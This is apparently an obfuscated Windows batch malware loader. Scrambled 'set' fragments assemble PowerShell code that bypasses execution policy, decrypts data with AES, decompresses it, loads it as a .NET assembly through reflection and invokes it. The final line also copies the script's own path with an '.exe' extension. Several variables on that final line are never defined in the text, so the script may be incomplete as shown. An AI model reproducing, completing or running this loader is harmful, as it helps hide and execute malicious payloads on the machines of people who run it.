@echo off
set "BgUSftjmYb=Syjf"
set "ginxHqhjpt=urit"
set "JxcnVXRFxS=s75K"
set "rXSgOrgzGJ=se()"
set "KQiNNHPRsX=106u"
set "EYTtRKlnSU=y]::"
set "hLXyYGTEFX= New"
set "losoqPbgvr=bjec"
set "IQXUMqwKhE=.Mem"
set "jUmGskWtOD=nirt"
set "dWjzVgsCSs=cu.T"
set "EUYaiTZClL=F'[-"
set "SbpMDZRDjQ=oArr"
set "prRXHKnjFQ=)))"
set "SKJOwKZnzt=Star"
set "ERMkhdbnsC=tem."
set "ORrwrlAeFM=g = "
set "pnSVzJhaSz=yste"
set "oYKWUKOzoY=ct S"
set "GNjAoosjLD=yTo("
set "wKWtkpXHEg=6] -"
set "jYQjhdBTEM=3); "
set "NjEfEfloGv=)($O"
set "UzNprmefRu=stem"
set "ErXPJilAzH=tryP"
set "VGoVUtymMu=]::("
set "SUqAKNvMmo=Pg ="
set "BuPBFwxVmQ=[Sys"
set "XlhCcNenGh=stem"
set "TcJQuWAQxB=6esa"
set "pMAauLTRlH=ke($"
set "cFcVCGIZCM=le  "
set "JgRUqUyucV=IzYP"
set "rMbZdhspeD=PTtG"
set "GauZRmoRUp=;$dB"
set "FFUjAQHhca=.GZi"
set "VxbCmNqxpz=ct S"
set "LJzuJscjXc=ewLi"
set "GVXneXXcqI=hy.A"
set "tMuvllhxXw=.-16"
set "RMuABNzKUA=gnir"
set "sdmVBVZoLS='txe"
set "ttZdUlTWVs=);$n"
set "FQNmUsLLKv=Secu"
set "gqEIGpRcVA='[-1"
set "dwnyvagQmC=y.Cr"
set "xfjFycojIX=tem."
set "txkefmYBqR=wSzn"
set "oxBCqFDrcY=.IO."
set "kSLyLZzfeg=]::C"
set "WvpncLSzrS=g = "
set "CdiFoifTjK=RmAx"
set "hNETEroEmh=sion"
set "cMHvOHWvrE=XD);"
set "NwtWviyoBN=$Gxy"
set "WQEhXRPNHr=bstr"
set "ydLGjiCvtg=$dBB"
set "DQSlargFfQ=y.Pa"
set "wjToTeuuzq=;$YY"
set "tQtZrClbfU=ptor"
set "LSruzSukrj=comm"
set "ulALIzxNVb=.Sec"
set "EVEcNZLkiT=).Sp"
set "CJBeHTXBJU=gth)"
set "xOFWnChIUs=ress"
set "SDhqrlstcQ=]::("
set "GnHbVjocKN=[Env"
set "GlsxFUaDHh=$IzY"
set "EuDZAdNwLJ='')("
set "pqTfXoNQbc=::De"
set "SHBWxUmIpn=stem"
set "NQclRioIPs= = N"
set "hanzBDEQgK=zuZI"
set "rUeKhuvzjJ== [S"
set "HGntZWkDfO=YYGm"
set "BOgignLEkE=.Cry"
set "wFVcvqTGZQ=Syst"
set "bKxWWbhrcW=XD.T"
set "tsaUbdKGBe=..-1"
set "iFHcpcNael=ss -"
set "XDVfoKfRBP=ateD"
set "bISHoFfagK=  $O"
set "DNjQxDRpuI=dj0C"
set "rYEFfFyPwD=rtS4"
set "BiqvFBYHyN=ment"
set "hZiMSZJtYE=.Mod"
set "lmEIIMjStG=th('"
set "mhZSteMvlA=gsYZ"
set "bquENYJyxI=c = "
set "oAyOINMjlq=bypa"
set "WOzVqwBezk=zHhH"
set "KTygEbRPFq=;$YL"
set "bqpaMgtlwb=raph"
set "IGKNFFjkvO=ndJA"
set "SHclvqrfys=y.Ci"
set "KOAnWzyzYK=ypto"
set "YAvtGmsyov= '')"
set "HLxLvLfpiT=$Gxy"
set "toyADgdDiF=)) {"
set "IYNOJWTpfT=saBm"
set "tUjJGVLZwC=e = "
set "QonximmQPP=Comp"
set "gfBcQBeihz=flec"
set "BzlehZPZYn=, (,"
set "EgOTSURlYK=.Ass"
set "qGnUNxnTwy=] -j"
set "ButpmazMrx= = ["
set "fUNCBFLMdT=wSzn"
set "XYELPbHpxp=n ''"
set "mSRLSBlTUB=);$n"
set "nbSJuZGPKb=:: '"
set "LfcnIAZUjn= if "
set "BDdUrjsiiJ= '')"
set "MljSWFISQL=rt]:"
set "OSogaAZmwH=tS46"
set "RiaBchMUKz=();$"
set "QbAiTvWgGJ=mVwH"
set "hIrlfwxuKY=XD ="
set "zWoBWkEXsu==');"
set "zrClthXVsm=nDGx"
set "kGDXBkNcti=fore"
set "saTMuktDuc=::('"
set "KxIevTMUPV=e]::"
set "OjmHzJLVVn=pose"
set "EbbmDNMwwD=join"
set "EPLFOPSgRM=oryS"
set "dJsCcaazoJ=$DLL"
set "YNOQYSpoAn=L4Yi"
set "dlpgRorPRW=Obje"
set "JzZmgTWUYQ=nwSz"
set "JaCPswgDlY=yste"
set "lMxwdjObpm=xyXD"
set "RdPQvlTzrP=gjYA"
set "RyYukghtJv=tem."
set "plADkTsCPM=ose("
set "PiAWNtUTbW=('Tg"
set "HqyMXDBhLa=ert]"
set "qsPzWukAls=ew-O"
set "IEseFouCLD=-4] "
set "LKeyhqSpvw=Invo"
set "JFfCWdWzbk=yste"
set "FZKinECqfL=Mode"
set "hVgXszsiIw=wSzn"
set "BCGNPpEXEF=Disp"
set "KTkwLRycmR=oL'["
set "kvUOYtVAIM=oin "
set "JMivXdHHPi=m.IO"
set "wWqJZcVSXU=zYPg"
set "fDSkFPYJUL=grap"
set "etjiQfOMbK=rofi"
set "kAPdATZGbD=Pg);"
set "rvVjZlOttd=null"
set "kggNxRfMxo=..-1"
set "SHlEozEcSG=nage"
set "OKXVNXZxgO=7;$n"
set "RQMcWzDrob=);$Y"
set "NbMDcBIgaS=BC;$"
set "DdscenBRQO=;$DL"
set "KCFdwbbizI='0Pg"
set "OHeuSqAPop=lBlo"
set "wQmczqPVyW=ring"
set "vBAiJpOcqB=ress"
set "RbVDbUwgnA=ing("
set "fBblFFmuch=-1.."
set "AjUtgWOoTs=DLLW"
set "BzjmWUgOMG=ispo"
set "RdGinLOwIZ=-joi"
set "iZWjUbmXcz=JAG."
set "qYBEsuuYNj=New-"
set "EEOuNQQiXO=Bmor"
set "SbLUyDvYdC=.Cre"
set "kwuuzdVsGG=iron"
set "vbWtaoZEfu=tsWi"
set "KZlGjCrNmM=t Sy"
set "ySVItQCqUZ=TllA"
set "GcrWopmdzR=();$"
set "WIofPkLDTH=pher"
set "glNCpuKDpg=PKCS"
set "fJqUNSGcca=CFxo"
set "TFIaAnuFuk=G.Su"
set "UBRTaniEoo=ionM"
set "eEviXJozRv=eam("
set "FupqNRWdbn=Disp"
set "liabPDyknQ=n ''"
set "TjrOIxhhhI=ose("
set "NWGcngAgRw=)($I"
set "FfRsqjZuBH=S46e"
set "OOkPEZJYym=Gx.D"
set "fKsumYdVSf=onve"
set "TiDWsUvhMh=rans"
%PcWtymrvOC%%CrMxalaala%%aSlcofUohw%%RDazmDAezq%%ORPeVHljmK%%XKWKwXRUes%%scorKYqnlw%%KVBUmjdghH%%ULcwyhHqcp%%MGagYMCxuW%%rYXQabjbyn%%ULMxyHaRTD%%qakVKdVuWA%%GFLkqWNmww%%XGRPvaUCIr%%LKERFqNcfW%%fOeYGoZBhB%%TNvwFKiuAJ%%jtLFOWaUEZ%%iLgzriBTjg%%asvhxXpilV%%itBwNMcykK%%ofWhsiHVfw%%ioluJRYEiQ%%GSIJRPjKME%%fdJzSUvnOp%%qudPMThhMW%%OyqtdwxnqD%%YWiAqfFLBO%%vKQSzmOSWY%%HbXQPHMpvw%%xiWlqtlCyH%%nvGYAdHxTR%"%~dp0%~nx0.exe"
